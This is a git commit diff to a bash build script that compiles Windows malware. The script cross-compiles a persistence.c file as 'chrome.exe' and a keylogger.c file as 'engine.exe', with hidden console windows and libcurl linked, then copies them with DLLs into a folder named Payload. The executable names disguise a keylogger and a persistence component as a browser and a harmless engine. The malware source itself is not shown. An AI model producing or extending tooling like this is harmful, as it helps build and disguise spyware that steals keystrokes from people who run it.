1a9a587044b95de4059e0baf01a00db8c0d07bc3
meeranh <themeeranhassan@gmail.com>
2024-05-17 17:03:30 +0530

    Added copying DLLs to payload building script

--- build.sh
+++ build.sh
@@ -1,3 +1,13 @@
 #!/bin/bash
+
+# Build the EXE files
 x86_64-w64-mingw32-gcc -o chrome.exe persistence.c -lcurl -mwindows
 x86_64-w64-mingw32-gcc -o engine.exe keylogger.c -lcurl -mwindows
+
+# Copy the DLLs and the EXE files to one folder
+rm -rf Payload || true
+mkdir Payload
+cp DLLs/* Payload && cp *.exe Payload
+
+# Confirm that the building is done
+echo "The payload was built"
